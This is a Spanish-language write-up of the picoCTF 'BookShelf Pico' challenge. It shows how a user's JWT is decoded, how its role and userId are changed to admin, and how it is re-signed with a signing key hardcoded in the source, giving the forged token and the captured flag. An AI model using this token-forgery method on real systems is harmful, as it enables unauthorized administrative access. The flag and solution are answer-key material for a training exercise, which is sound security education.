## Descripción
BookShelf Pico, my premium online book-reading service.I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!

Here are the credentials to get you started:

- Username: "user"
- Password: "user"

Source code can be downloaded [here](https://artifacts.picoctf.net/c/481/bookshelf-pico.zip).Website can be accessed [here!](http://saturn.picoctf.net:59572/).

## Pistas
1. Maybe try to find the JWT Signing Key ("secret key") in the source code? Maybe it's hardcoded somewhere? Or maybe try to crack it?
2. The 'role' and 'userId' fields in the JWT can be of interest to you!
3. The 'controllers', 'services' and 'security' java packages in the given source code might need your attention. We've provided a README.md file that contains some documentation.
4. Upgrade your 'role' with the _new_ (cracked) JWT. And re-login for the new role to get reflected in browser's localStorage.
## Solución 1
1. Al logearnos en la pagina vemos que en la pestaña local storage hay un token
2. Decodificamos el token con [jwt.io]()
```
Input:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc0NTQ3MTkwMSwiaWF0IjoxNzQ0ODY3MTAxLCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.OAqiSnzh73Ws1Vd-wJKGQ6kmeA-fMvmKEmArr2Oxfhk

Output:
{
  "role": "Free",
  "iss": "bookshelf",
  "exp": 1745471901,
  "iat": 1744867101,
  "userId": 1,
  "email": "user"
}

```
3. Cambiamos los valores role, userId y email
```
{
  "role": "admin",
  "iss": "bookshelf",
  "exp": 1745471901,
  "iat": 1744867101,
  "userId": 2,
  "email": "admin"
}
```
4. Buscamos la clave en el código, en este caso se encontraba en `SecretGenerator.java` 
5. Sustituimos por la clave generada
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3NDU0NzE5MDEsImlhdCI6MTc0NDg2NzEwMSwidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.WqOVfCDR93w_mZf0lzGDetj49CAI7-eB7fdYUz2Ew7U
```
6. Recargamos la pagina y obtenemos la bandera
`picoCTF{w34k_jwt_n0t_g00d_ca4d9701}`
## Referencias
